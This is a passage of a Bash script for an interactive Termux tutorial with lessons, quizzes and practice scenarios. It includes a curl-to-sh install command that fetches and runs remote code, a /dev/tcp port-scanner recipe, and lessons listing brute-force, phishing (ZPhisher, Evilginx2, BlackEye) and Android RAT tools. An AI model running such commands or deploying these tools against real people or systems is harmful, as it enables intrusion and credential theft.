    echo ""
    show_cmd "# Install Oh My Zsh:"
    show_cmd "sh -c \"\$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
    echo ""
    echo -e "  ${CYAN}Popular Plugins:${NC}"
    echo -e "  Edit ~/.zshrc → plugins=(...)"
    echo -e "  ${GREEN}  plugins=(git python pip node npm colored-man-pages)${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ BASH ALIASES ━━━${NC}"
    show_cmd "nano ~/.bashrc"
    echo ""
    echo -e "  ${GREEN}  # Useful aliases${NC}"
    echo -e "  ${GREEN}  alias ll='ls -la'${NC}"
    echo -e "  ${GREEN}  alias la='ls -A'${NC}"
    echo -e "  ${GREEN}  alias ..='cd ..'${NC}"
    echo -e "  ${GREEN}  alias ...='cd ../..'${NC}"
    echo -e "  ${GREEN}  alias update='pkg update && pkg upgrade -y'${NC}"
    echo -e "  ${GREEN}  alias py='python'${NC}"
    echo -e "  ${GREEN}  alias myip='curl -s ifconfig.me'${NC}"
    echo -e "  ${GREEN}  alias weather='curl wttr.in'${NC}"
    echo -e "  ${GREEN}  alias ports='nmap -sT localhost'${NC}"
    echo -e "  ${GREEN}  alias cls='clear'${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Custom prompt${NC}"
    echo -e "  ${GREEN}  PS1='\\[\\e[32m\\]\\u@termux\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]\\$ '${NC}"
    echo ""
    show_cmd "source ~/.bashrc                     # Reload"
    echo ""

    echo -e "  ${WHITE}━━━ MOTD (Welcome Message) ━━━${NC}"
    show_cmd "nano \$PREFIX/etc/motd"
    explain "Edit to set your custom welcome message."
    echo ""

    echo -e "  ${WHITE}━━━ USEFUL EXTRA KEYS ━━━${NC}"
    echo -e "  ${WHITE}Volume Up + Q${NC}   → Show extra keys"
    echo -e "  ${WHITE}Volume Up + W${NC}   → Forward key logging"
    echo -e "  ${WHITE}Volume Up + E${NC}   → Ctrl key"
    echo -e "  ${WHITE}Volume Down${NC}     → Special keys (ESC, TAB, etc.)"

    echo ""
    echo -e "  ${WHITE}━━━ FISH SHELL (User Friendly) ━━━${NC}"
    tool_name "fish"
    show_cmd "pkg install fish"
    show_cmd "fish"
    explain "A smart shell with autosuggestions and syntax highlighting out of the box."
    echo ""

    quiz "Which shell provides web-based configuration via 'fish_config'?" "Bash" "Zsh" "Fish" "C"

    live_lab "Run 'fish' to try the smart shell, then type 'exit' to return to Bash."
    pause 15
}

#=============================================================================
# LESSON 16: USEFUL PROJECT IDEAS
#=============================================================================
lesson_16() {
    header "LESSON 16: Project Ideas & Quick Recipes"

    termux-tts-speak "Lesson 16 provides project ideas and recipes, such as setting up web servers, backup scripts, and system monitors." 2>/dev/null &

    echo -e "  ${WHITE}━━━ 1. PERSONAL WEB SERVER ━━━${NC}"
    show_cmd "pkg install apache2"
    show_cmd "apachectl start"
    show_cmd "echo '<h1>My Site</h1>' > \$PREFIX/share/apache2/default-site/htdocs/index.html"
    explain "Visit http://localhost:8080 in your browser"
    echo ""

    echo -e "  ${WHITE}━━━ 2. FILE BACKUP SCRIPT ━━━${NC}"
    echo -e "  ${GREEN}  #!/bin/bash${NC}"
    echo -e "  ${GREEN}  DATE=\$(date +%Y%m%d_%H%M%S)${NC}"
    echo -e "  ${GREEN}  BACKUP_DIR=~/backups${NC}"
    echo -e "  ${GREEN}  mkdir -p \$BACKUP_DIR${NC}"
    echo -e "  ${GREEN}  tar -czf \$BACKUP_DIR/projects_\$DATE.tar.gz ~/projects/${NC}"
    echo -e "  ${GREEN}  echo \"Backup created: projects_\$DATE.tar.gz\"${NC}"
    echo -e "  ${GREEN}  # Keep only last 5 backups${NC}"
    echo -e "  ${GREEN}  ls -t \$BACKUP_DIR/*.tar.gz | tail -n +6 | xargs rm -f${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ 3. SYSTEM MONITOR ━━━${NC}"
    echo -e "  ${GREEN}  #!/bin/bash${NC}"
    echo -e "  ${GREEN}  while true; do${NC}"
    echo -e "  ${GREEN}    clear${NC}"
    echo -e "  ${GREEN}    echo '=== SYSTEM MONITOR ==='${NC}"
    echo -e "  ${GREEN}    echo \"Date: \$(date)\"${NC}"
    echo -e "  ${GREEN}    echo \"Uptime: \$(uptime)\"${NC}"
    echo -e "  ${GREEN}    echo \"\"${NC}"
    echo -e "  ${GREEN}    echo '--- Disk Usage ---'${NC}"
    echo -e "  ${GREEN}    df -h | head -5${NC}"
    echo -e "  ${GREEN}    echo \"\"${NC}"
    echo -e "  ${GREEN}    echo '--- Memory ---'${NC}"
    echo -e "  ${GREEN}    free -h 2>/dev/null || cat /proc/meminfo | head -3${NC}"
    echo -e "  ${GREEN}    echo \"\"${NC}"
    echo -e "  ${GREEN}    echo '--- Network ---'${NC}"
    echo -e "  ${GREEN}    ip addr show wlan0 2>/dev/null | grep inet${NC}"
    echo -e "  ${GREEN}    sleep 5${NC}"
    echo -e "  ${GREEN}  done${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ 4. PORT SCANNER (Bash) ━━━${NC}"
    echo -e "  ${GREEN}  #!/bin/bash${NC}"
    echo -e "  ${GREEN}  TARGET=\$1${NC}"
    echo -e "  ${GREEN}  echo \"Scanning \$TARGET...\"${NC}"
    echo -e "  ${GREEN}  for PORT in 21 22 23 25 53 80 443 8080 3306 5432; do${NC}"
    echo -e "  ${GREEN}    (echo > /dev/tcp/\$TARGET/\$PORT) 2>/dev/null && \\${NC}"
    echo -e "  ${GREEN}      echo \"Port \$PORT: OPEN\"${NC}"
    echo -e "  ${GREEN}  done${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ 5. YOUTUBE DOWNLOADER ━━━${NC}"
    show_cmd "pip install yt-dlp"
    show_cmd "yt-dlp 'https://youtube.com/watch?v=VIDEO_ID'"
    show_cmd "yt-dlp -x --audio-format mp3 'URL'  # Audio only"
    show_cmd "yt-dlp -f 'best[height<=720]' 'URL' # Max 720p"
    echo ""

    echo -e "  ${WHITE}━━━ 6. QUICK API TESTING ━━━${NC}"
    show_cmd "# Test REST APIs"
    show_cmd "curl -s https://jsonplaceholder.typicode.com/posts/1 | jq ."
    show_cmd "curl -X POST https://httpbin.org/post -d 'key=value' | jq ."
    show_cmd "curl -H 'Authorization: Bearer TOKEN' https://api.example.com"

    pause 16
}

#=============================================================================
# LESSON 17: QUICK REFERENCE CARD
#=============================================================================
lesson_17() {
    header "LESSON 17: Quick Reference Card"

    termux-tts-speak "Lesson 17 is a quick reference guide for keyboard shortcuts, volume key combinations, and essential packages." 2>/dev/null &

    echo -e "  ${WHITE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "  ${WHITE}║          TERMUX QUICK REFERENCE CARD                 ║${NC}"
    echo -e "  ${WHITE}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${WHITE}║ ${CYAN}KEYBOARD SHORTCUTS:${WHITE}                   ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+C        → Cancel/Kill process                  ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+D        → End of input / Logout                ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+Z        → Suspend process                      ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+L        → Clear screen                         ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+A        → Move cursor to start                 ║${NC}"
    echo -e "  ${WHITE}║ Ctrl+E        → Move cursor to end                   ║${NC}"
    echo -e "  ${WHITE}║ Tab           → Auto-complete                        ║${NC}"
    echo -e "  ${WHITE}║ ↑ ↓           → Command history                      ║${NC}"
    echo -e "  ${WHITE}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${WHITE}║ ${CYAN}VOLUME KEY COMBOS:${WHITE}                    ║${NC}"
    echo -e "  ${WHITE}║ Vol▲ + Q      → Extra keys row                       ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + C      → Ctrl+C                               ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + L      → Pipe |                               ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + D      → Tab key                              ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + W      → Arrow Up                             ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + S      → Arrow Down                           ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + A      → Arrow Left                           ║${NC}"
    echo -e "  ${WHITE}║ Vol▼ + D      → Arrow Right                          ║${NC}"
    echo -e "  ${WHITE}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${WHITE}║ ${CYAN}MUST-HAVE PACKAGES:${WHITE}                   ║${NC}"
    echo -e "  ${WHITE}║ git curl wget openssh python nodejs nano vim         ║${NC}"
    echo -e "  ${WHITE}║ nmap tmux tree jq fzf htop man proot-distro          ║${NC}"
    echo -e "  ${WHITE}║ termux-api ffmpeg micro zsh neofetch                 ║${NC}"
    echo -e "  ${WHITE}║ cronie build-essential                               ║${NC}"
    echo -e "  ${WHITE}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${WHITE}║ ${CYAN}INSTALL EVERYTHING:${WHITE}                   ║${NC}"
    echo -e "  ${WHITE}║ pkg install git curl wget openssh python nodejs      ║${NC}"
    echo -e "  ${WHITE}║   nano vim nmap tmux tree jq fzf htop man            ║${NC}"
    echo -e "  ${WHITE}║   termux-api ffmpeg micro zsh neofetch               ║${NC}"
    echo -e "  ${WHITE}║   proot-distro build-essential                       ║${NC}"
    echo -e "  ${WHITE}╚══════════════════════════════════════════════════════╝${NC}"

    pause 17
}

#=============================================================================
# EXPORT PROGRESS
#=============================================================================
export_report() {
    local report="$HOME/storage/downloads/Termux_Graduation_Report.md"
    header "EXPORT PROGRESS REPORT"
    echo -e "  Generating report to: $report"
    
    {
        echo "# TERMUX MASTERCLASS PROGRESS REPORT"
        echo "Student: $USER_NAME"
        echo "Date: $(date)"
        echo "## Completed Lessons"
        for i in {1..34}; do
            if [[ -n "${DONE_LESSONS[$i]}" ]]; then
                echo "- [x] ${LESSON_TITLES[$i]} (Completed: ${DONE_LESSONS[$i]})"
            else
                echo "- [ ] ${LESSON_TITLES[$i]}"
            fi
        done
        echo "## Achievements"
        for ach in "${!ACHIEVEMENTS[@]}"; do echo "- $ach"; done
    } > "$report"
    
    success "Export successful! Check your Downloads folder."
    termux-tts-speak "Progress report generated" 2>/dev/null
    pause
}

#=============================================================================
# LESSON 18: CLOUD & SYNC
#=============================================================================
lesson_18() {
    header "LESSON 18: Cloud & Sync (Rclone & Aria2)"
    termux-tts-speak "Lesson 18 covers cloud synchronization using Rclone and high-speed multi-protocol downloads with Aria2." 2>/dev/null &
    explain "Termux can become a powerful bridge between your phone and the cloud."
    tool_name "Rclone"
    explain "Sync files with Google Drive, Dropbox, OneDrive, and more."
    show_cmd "pkg install rclone"
    tool_name "Aria2"
    explain "A multi-protocol download utility (HTTP, FTP, BitTorrent)."
    show_cmd "pkg install aria2"
    pause 18
}

#=============================================================================
# LESSON 19: MODERN CLI TOOLS
#=============================================================================
lesson_19() {
    header "LESSON 19: Modern CLI Tools (Rust-based Powerhouse)"
    termux-tts-speak "In Lesson 19, we explore modern Rust-based command line tools like bat, eza, tldr, and dust for a faster workflow." 2>/dev/null &
    explain "Enhance your workflow with faster, colorized alternatives to classic tools."
    tool_name "Bat"
    explain "A 'cat' clone with syntax highlighting and Git integration."
    tool_name "Eza"
    explain "A modern 'ls' replacement with icons and better defaults."
    tool_name "Tldr"
    explain "Simplified man pages with practical examples."
    tool_name "Dust"
    explain "A more intuitive 'du' to see what's taking up disk space."
    pause 19
}

#=============================================================================
# LESSON 20: SELF-HOSTING
#=============================================================================
lesson_20() {
    header "LESSON 20: Self-Hosting from your Android Device"
    termux-tts-speak "Lesson 20 teaches you about self-hosting. You will learn to run services like Caddy web server and Gitea on your device." 2>/dev/null &
    explain "Run your own services without relying on external servers."
    tool_name "Caddy"
    explain "The easiest web server with automatic HTTPS."
    tool_name "Gitea"
    explain "Host your own private Git service, similar to GitHub."
    pause 20
}

#=============================================================================
# GRADUATION EXAM (Formerly Lesson 18)
#=============================================================================
graduation_exam() {
    header "FINAL TEST: Graduation Exam"
    
    termux-tts-speak "Welcome to the final graduation exam. Please answer the following questions to verify your mastery and complete the masterclass." 2>/dev/null &

    local score=0
    
    echo -e "  ${WHITE}Complete these 5 questions to graduate!${NC}"
    echo ""

    quiz "How do you search for a package in Termux?" "pkg find" "pkg search" "pkg look" "B" && ((score++))
    echo ""
    quiz "What is the default SSH port in Termux?" "22" "8022" "443" "B" && ((score++))
    echo ""
    quiz "Which tool allows running Ubuntu inside Termux?" "proot-distro" "vnc-server" "ubuntu-box" "A" && ((score++))
    echo ""
    quiz "What character is used for pipe in Termux Volume combos?" "Vol Down + L" "Vol Up + P" "Vol Down + C" "A" && ((score++))
    echo ""
    quiz "Which command reloads termux settings?" "termux-refresh" "termux-reload-settings" "source .prop" "B" && ((score++))
    
    line
    echo -e "  ${WHITE}Final Score: $score / 5${NC}"
    [[ $score -eq 5 ]] && success "GRADUATED! You are now a Termux Master." || warn "Keep practicing to reach 5/5!"
    pause
}

#=============================================================================
# ADVANCED SECURITY TRACK (LESSONS 21-27)
#=============================================================================
lesson_21() {
    header "LESSON 21: OSINT & Recon"
    termux-tts-speak "Lesson 21 introduces open source intelligence and reconnaissance tools like Amass and bbot for mapping infrastructure." 2>/dev/null &
    explain "Gathering public intelligence and mapping infrastructure."
    tool_name "Amass"
    explain "A world-class tool for subdomain enumeration and network mapping."
    tool_name "bbot"
    explain "Recursive internet scanner for OSINT automation."
    tip "Keywords: CloudEnum, CMSeeK, Crips, dmitry, dnsrecon."
    pause 21
}

lesson_22() {
    header "LESSON 22: Web Application Testing"
    termux-tts-speak "In Lesson 22, we focus on web application testing using tools like XSStrike and Gobuster to find vulnerabilities." 2>/dev/null &
    explain "Finding flaws in web servers, CMS, and logic."
    tool_name "XSStrike"
    explain "High-level XSS detection and payload generation."
    tool_name "Gobuster"
    explain "Brute-forcing URIs and DNS subdomains."
    tip "Keywords: Sublist3r, WhatWeb, Fimap, Commix, Wapiti."
    pause 22
}

lesson_23() {
    header "LESSON 23: Advanced Network Scanning"
    termux-tts-speak "Lesson 23 covers advanced network scanning techniques using high-speed tools like Masscan and Hping3." 2>/dev/null &
    explain "Moving beyond Nmap for high-speed reconnaissance."
    tool_name "Masscan"
    explain "TCP port scanner, spewing SYN packets at high rates."
    tool_name "Hping3"
    explain "Command-line TCP/IP packet assembler and analyzer."
    tip "Keywords: Zmap, Tcpdump, Scapy, ARPscan."
    pause 23
}

lesson_24() {
    header "LESSON 24: Password Attacks"
    termux-tts-speak "Lesson 24 explores password attacks. We will use tools like Medusa and CeWL for hash cracking and brute-forcing." 2>/dev/null &
    explain "Hash cracking and network login brute-forcing."
    tool_name "Medusa"
    explain "A fast and modular parallel network login cracker."
    tool_name "CeWL"
    explain "Create wordlists by crawling specific websites."
    tip "Keywords: RainbowCrack, Patator, Brutespray."
    pause 24
}

lesson_25() {
    header "LESSON 25: Mobile Security"
    termux-tts-speak "In Lesson 25, we look at mobile security and reverse engineering using APKTool and the Frida instrumentation toolkit." 2>/dev/null &
    explain "Android app reverse engineering and instrumentation."
    tool_name "APKTool"
    explain "Tool for reverse engineering 3rd party, closed, binary Android apps."
    tool_name "Frida"
    explain "Dynamic instrumentation toolkit for developers and security researchers."
    tip "Keywords: Drozer, MobSF, Objection, jadx."
    pause 25
}

lesson_26() {
    header "LESSON 26: Social Engineering"
    termux-tts-speak "Lesson 26 introduces social engineering simulations with tools like ZPhisher and the Social-Engineer Toolkit." 2>/dev/null &
    explain "Attacking the human element through simulation."
    tool_name "ZPhisher"
    explain "Easy-to-use automated phishing tool with diverse templates."
    tool_name "SET (Social-Engineer Toolkit)"
    explain "Standard framework for social engineering tests."
    tip "Keywords: SocialFish, Evilginx2, Gophish."
    pause 26
}

lesson_27() {
    header "LESSON 27: Forensics & RE"
    termux-tts-speak "Lesson 27 covers digital forensics and reverse engineering using Volatility, Ghidra, and binary analysis tools." 2>/dev/null &
    explain "Deep analysis of files, memory, and binaries."
    tool_name "Volatility"
    explain "Memory forensics for incident response and malware analysis."
    tool_name "Ghidra"
    explain "High-end software reverse engineering suite."
    tip "Keywords: Radare2, ExifTool, Binwalk, YARA, ClamAV."
    pause 27
}

#=============================================================================
# ADVANCED SECURITY TRACK (LESSONS 28-34)
#=============================================================================
lesson_28() {
    header "LESSON 28: OSINT & Reconnaissance (Advanced)"
    termux-tts-speak "Lesson 28 dives deeper into advanced OSINT and reconnaissance with tools like ATSCAN, CMSeeK, and dnsrecon." 2>/dev/null &
    explain "Deep dive into advanced information gathering techniques."
    tool_name "ATSCAN"
    explain "Automated dork search and exploit scanner for web reconnaissance."
    tool_name "bing-ip2hosts"
    explain "Discover virtual hosts and websites hosted on a given IP address using Bing."
    tool_name "CloudEnum"
    explain "Enumerate resources across various cloud providers (AWS, Azure, GCP)."
    tool_name "CMSeeK"
    explain "Detect and exploit vulnerabilities in Content Management Systems."
    tool_name "CMSmap"
    explain "Automated CMS scanner that can detect various CMS types and their vulnerabilities."
    tool_name "Crips"
    explain "A powerful IP/DNS information gathering tool."
    tool_name "dmitry"
    explain "Deepmagic Information Gathering Tool - performs various OSINT tasks."
    tool_name "dnsrecon"
    explain "Advanced DNS enumeration script for comprehensive DNS record analysis."
    pause 28
}

lesson_29() {
    header "LESSON 29: Web Application Testing (Advanced)"
    termux-tts-speak "In Lesson 29, we explore specialized web vulnerability scanners like Wapiti, Dirb, and command injection tools." 2>/dev/null &
    explain "Explore more specialized tools for web vulnerability assessment."
    tool_name "Wapiti"
    explain "A web vulnerability scanner that performs black-box testing."
    tool_name "Dirb"
    explain "A Web Content Scanner that brute-forces directories and files on web servers."
    tool_name "Fimap"
    explain "Local/Remote File Inclusion (LFI/RFI) vulnerability scanner and exploiter."
    tool_name "Commix"
    explain "Automated tool for detecting and exploiting command injection vulnerabilities."
    pause 29
}

lesson_30() {
    header "LESSON 30: Network Scanning & Enumeration (Advanced)"
    termux-tts-speak "Lesson 30 focuses on advanced network scanning and enumeration with tools like Zmap and Ettercap for man-in-the-middle attacks." 2>/dev/null &
    explain "Beyond basic Nmap, for high-speed and specialized network analysis."
    tool_name "Zmap"
    explain "A fast single-packet network scanner designed for Internet-wide network surveys."
    tool_name "Ettercap"
    explain "A comprehensive suite for Man-in-the-Middle attacks on LAN."
    tool_name "fping (as IPscan)"
    explain "A program to send ICMP echo probes to network hosts, much faster than ping when checking many hosts."
    tool_name "ARPscan"
    explain "A tool to quickly discover devices on a local Ethernet network using ARP requests."
    pause 30
}

lesson_31() {
    header "LESSON 31: Password Attacks (Advanced)"
    termux-tts-speak "Lesson 31 covers advanced password cracking techniques using RainbowCrack and multi-purpose brute-forcers." 2>/dev/null &
    explain "Advanced techniques and tools for cracking and brute-forcing credentials."
    tool_name "RainbowCrack"
    explain "A general purpose hash cracker using time-memory trade-off (rainbow tables)."
    tool_name "THC-pptp-bruter"
    explain "A brute-force password cracker for PPTP VPNs."
    tool_name "Patator"
    explain "A multi-purpose brute-forcer, supporting various services and protocols."
    tool_name "Brutespray"
    explain "Automates brute-force attacks against services discovered by Nmap."
    pause 31
}

lesson_32() {
    header "LESSON 32: Android/Mobile Tools"
    termux-tts-speak "In Lesson 32, we analyze and secure Android applications using tools like Qark, Objection, and JADX decompilers." 2>/dev/null &
    explain "Tools for analyzing, reverse-engineering, and securing Android applications."
    tool_name "AndroRAT"
    explain "A Remote Administration Tool for Android (complex setup, conceptual)."
    tool_name "Drozer"
    explain "A comprehensive security testing framework for Android (requires server on device)."
    tool_name "MobSF"
    explain "Mobile Security Framework - an automated, all-in-one mobile app pen-testing framework (complex setup)."
    tool_name "Qark"
    explain "A static analysis tool to find security vulnerabilities in Android applications."
    tool_name "Objection"
    explain "Runtime mobile exploration toolkit powered by Frida, for dynamic analysis."
    tool_name "jadx"
    explain "DEX to Java decompiler for Android applications."
    tool_name "APKInspector"
    explain "A powerful GUI tool for analyzing Android applications (complex setup)."
    pause 32
}

lesson_33() {
    header "LESSON 33: Social Engineering & Phishing"
    termux-tts-speak "Lesson 33 explores social engineering and phishing toolkits like HiddenEye and BlackEye for testing user awareness." 2>/dev/null &
    explain "Simulating human-centric attacks to test awareness and defenses."
    tool_name "SocialFish"
    explain "A phishing toolkit with various templates for social engineering."
    tool_name "Evilginx2"
    explain "A man-in-the-middle attack framework used for phishing login credentials along with session cookies (complex setup)."
    tool_name "KingPhisher"
    explain "A tool for testing and promoting user awareness by simulating real-world phishing attacks (complex setup)."
    tool_name "HiddenEye"
    explain "A modern phishing framework with advanced features and templates."
    tool_name "BlackEye"
    explain "A phishing page generator with many templates for popular services."
    tool_name "ShellPhish"
    explain "Another versatile phishing toolkit with a range of templates."
    tool_name "Weeman"
    explain "A simple HTTP server for phishing, acting as a transparent proxy."
    tool_name "Gophish"
    explain "An open-source phishing framework designed for businesses and penetration testers (complex setup)."
    pause 33
}

lesson_34() {
    header "LESSON 34: Forensics & Malware Analysis"
    termux-tts-speak "Lesson 34 covers forensics and malware analysis using YARA rules, binary string extraction, and file recovery tools." 2>/dev/null &
    explain "Deep dive into digital forensics, reverse engineering, and malware identification."
    tool_name "YARA"
    explain "The 'pattern matching swiss knife' for malware researchers, used to identify and classify malware samples."
    tool_name "Strings"
    explain "A standard utility to find and print human-readable strings embedded in binary files."
    tool_name "Foremost"
    explain "A console program to recover files based on their headers, footers, and internal data structures."
    tool_name "LIEF (as PEiD alternative)"
    explain "Library to parse, modify and rebuild ELF, PE, Mach-O formats (useful for analyzing packed executables)."
    pause 34
}

#=============================================================================
# LEARN TERMUX TOOLS: CURRICULUM MENU
#=============================================================================
learn_termux_tools() {
    while true; do
        local term_width=$(get_width)
        local box_width=60
        local margin=$(( (term_width - box_width) / 2 ))
        (( margin < 0 )) && margin=0
        local pad=$(printf "%${margin}s" "")

        header "LEARN TERMUX TOOLS: Curriculum"

        # Big Cyber ASCII for Lesson Area
        echo -e "${CYAN}"
        center "  _      ______  _____ _____  ____  _   _  _____ "
        center " | |    |  ____|/ ____/ ____|/ __ \| \ | |/ ____|"
        center " | |    | |__  | (___| (___ | |  | |  \| | (___  "
        center " | |    |  __|  \___ \\\\___ \\ | |  | | . \` |\\\\___ \\ "
        center " | |____| |____ ____) |___) | |__| | |\  |____) |"
        center " |______|______|_____/_____/ \____/|_| \_|_____/ "
        echo -e "${NC}"

        echo -e "${pad}${CYAN}📊 Category Completion:${NC}"
        echo -e "${pad}$(get_progress_string)"
        echo ""

        echo -e "${pad}${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${pad}║ ${CYAN}1${NC} $(get_status 1) Intro  ${CYAN}2${NC} $(get_status 2) Setup  ${CYAN}3${NC} $(get_status 3) Editors  ${CYAN}4${NC} $(get_status 4) Python  ${CYAN}5${NC} $(get_status 5) Node  ║"
        echo -e "${pad}║ ${CYAN}6${NC} $(get_status 6) Git    ${CYAN}7${NC} $(get_status 7) SSH    ${CYAN}8${NC} $(get_status 8) Net     ${CYAN}9${NC} $(get_status 9) API   ${CYAN}10${NC} $(get_status 10) Sec   ║"
        echo -e "${pad}║ ${CYAN}11${NC} $(get_status 11) Auto  ${CYAN}12${NC} $(get_status 12) DB    ${CYAN}13${NC} $(get_status 13) Linux  ${CYAN}14${NC} $(get_status 14) Files ${CYAN}15${NC} $(get_status 15) Shell ║"
        echo -e "${pad}║ ${CYAN}18${NC} $(get_status 18) Cloud ${CYAN}19${NC} $(get_status 19) Modern ${CYAN}20${NC} $(get_status 20) Host   ${CYAN}16${NC} $(get_status 16) Idea  ${CYAN}17${NC} $(get_status 17) Card  ║"
        echo -e "${pad}║ ${CYAN}21${NC} $(get_status 21) OSINT ${CYAN}22${NC} $(get_status 22) Web   ${CYAN}23${NC} $(get_status 23) NetEx ${CYAN}24${NC} $(get_status 24) Pass  ${CYAN}25${NC} $(get_status 25) Mob   ║"
        echo -e "${pad}║ ${CYAN}26${NC} $(get_status 26) SocEn ${CYAN}27${NC} $(get_status 27) Foren ${CYAN}28${NC} $(get_status 28) OSINT ${CYAN}29${NC} $(get_status 29) Web   ║"
        echo -e "${pad}║ ${CYAN}30${NC} $(get_status 30) NetSc ${CYAN}31${NC} $(get_status 31) Pass  ${CYAN}32${NC} $(get_status 32) Mob   ${CYAN}33${NC} $(get_status 33) SocEn ${CYAN}34${NC} $(get_status 34) Foren ║"
        echo -e "${pad}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""
        center "${RED}[B]${NC} Back to Main Menu" # This line is not the target.
        echo ""
        echo -ne "${pad}  ${NC}\033[25m${YELLOW}Select Lesson (1-34) ➤ ${NC}"
        read choice

        case $choice in
            1) lesson_1 ;; 2) lesson_2 ;; 3) lesson_3 ;; 4) lesson_4 ;; 5) lesson_5 ;;
            6) lesson_6 ;; 7) lesson_7 ;; 8) lesson_8 ;; 9) lesson_9 ;; 10) lesson_10 ;;
            11) lesson_11 ;; 12) lesson_12 ;; 13) lesson_13 ;; 14) lesson_14 ;; 15) lesson_15 ;;
            16) lesson_16 ;; 17) lesson_17 ;; 18) lesson_18 ;; 19) lesson_19 ;; 20) lesson_20 ;;
            21) lesson_21 ;; 22) lesson_22 ;; 23) lesson_23 ;; 24) lesson_24 ;; 25) lesson_25 ;; 26) lesson_26 ;; 27) lesson_27 ;;
            28) lesson_28 ;; 29) lesson_29 ;; 30) lesson_30 ;; 31) lesson_31 ;; 32) lesson_32 ;; 33) lesson_33 ;; 34) lesson_34 ;;
            [Bb]) return ;;
            *) echo -e "  ${RED}Invalid choice.${NC}"; sleep 1 ;;
        esac
    done
}

#=============================================================================
# TRY AGAIN: REMEDIATION CENTER
#=============================================================================
try_again_session() {
    while true; do
        local failed_scns=()
        for s in "${!FAILED_SCENARIOS[@]}"; do
            [[ "${FAILED_SCENARIOS[$s]}" == "1" ]] && failed_scns+=("$s")
        done

        local failed_t_count=0
        for t in "${!FAILED_TOOLS[@]}"; do
            (( FAILED_TOOLS["$t"] > 0 )) && ((failed_t_count++))
        done

        header "TRY AGAIN: Remediation Center"
        echo -e "  ${WHITE}Master the challenges you missed.${NC}"
        echo ""
        echo -e "  ${CYAN}[1]${NC} Retry Failed Tool Quizzes (${YELLOW}$failed_t_count tools${NC})"
        echo -e "  ${CYAN}[2]${NC} Retry Failed Missions (${YELLOW}${#failed_scns[@]} missions${NC})"
        echo -e "  ${RED}[B]${NC} Back to Main Menu"
        echo ""
        echo -ne "  ${NC}\033[25m${YELLOW}Select path ➤ ${NC}"
        read -n 1 r_choice
        echo ""

        case $r_choice in
            1) review_mode ;;
            2)
                if [[ ${#failed_scns[@]} -eq 0 ]]; then
                    success "No failed missions found! You are a perfect operator."
                    sleep 1
                else
                    header "RETRY MISSIONS"
                    for i in "${!failed_scns[@]}"; do
                        echo -e "  ${GREEN}[$((i+1))]${NC} ${failed_scns[$i]}"
                    done
                    echo -ne "\n  Select mission to retry: "
                    read m_idx
                    if [[ "$m_idx" =~ ^[0-9]+$ ]] && (( m_idx > 0 && m_idx <= ${#failed_scns[@]} )); then
                        local m_name="${failed_scns[$((m_idx-1))]}"
                        case "$m_name" in
                            "Networking") networking_scenario ;;
                            "Security") security_scenario ;;
                            "Forensics") forensic_scenario ;;
                            "Logs") log_analysis_scenario ;;
                            "Health") system_health_scenario ;;
                            "Nmap") nmap_scenario ;;
                            "Binwalk") binwalk_scenario ;;
                            "Radare2") radare2_scenario ;;
                            "YARA") yara_scenario ;;
                        esac
                    fi
                fi
                ;;
            [Bb]) return ;;
        esac
    done
}

#=============================================================================
# NETWORKING SCENARIO: IP & PORTS
#=============================================================================
networking_scenario() {
    header "SCENARIO MODE: Networking Challenge"
    FAILED_SCENARIOS["Networking"]=0
    # Randomize targets and ports for variety
    local targets=("google.com" "github.com" "cloudflare.com" "bing.com" "example.com")
    local ports=("80" "443" "53" "22" "8080")
    local target=${targets[$RANDOM % ${#targets[@]}]}
    local port=${ports[$RANDOM % ${#ports[@]}]}

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  Identify the status of your local environment and simulate a connection check."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Find out your local IP address."
    echo -e "  ${CYAN}Task 2:${NC} Check if ${MAGENTA}$target${NC} is reachable on port ${MAGENTA}$port${NC}."
    echo -e "  ${CYAN}Task 3:${NC} Scan ${MAGENTA}$target${NC} for common open ports."
    echo ""
    
    tip "Helpful commands: 'ip addr', 'nc -zv', 'nmap'"
    
    live_lab "1. Identify local IP | 2. Probe $target:$port | 3. Scan $target"
    
    line
    echo -e "  ${WHITE}Quick Challenge Check:${NC}"
    quiz "Which command is commonly used to see your IP address in Termux?" "ifconfig" "ip addr" "netstat" "B"
    
    if [ $? -eq 0 ]; then
        success "Mission Accomplished! You are proficient in basic network discovery."
    else
        FAILED_SCENARIOS["Networking"]=1
        warn "Keep practicing your networking commands!"
    fi
    
    pause
}

#=============================================================================
# SECURITY SCENARIO: HIDDEN FILE HUNT
#=============================================================================
security_scenario() {
    header "SCENARIO MODE: Security Challenge"
    FAILED_SCENARIOS["Security"]=0
    
    # Setup challenge environment
    local target_dir="$HOME/.sys_configs"
    mkdir -p "$target_dir"
    echo "SECRET_FLAG=TERMUX_GREP_MASTER_2024" > "$target_dir/.hidden_data"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A sensitive flag has been hidden inside a hidden configuration file."
    echo -e "  The file is located somewhere in a hidden directory under your HOME."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use 'find' to locate all hidden files in your home directory."
    echo -e "  ${CYAN}Task 2:${NC} Use 'grep' to search for 'SECRET_FLAG' within those files."
    echo ""
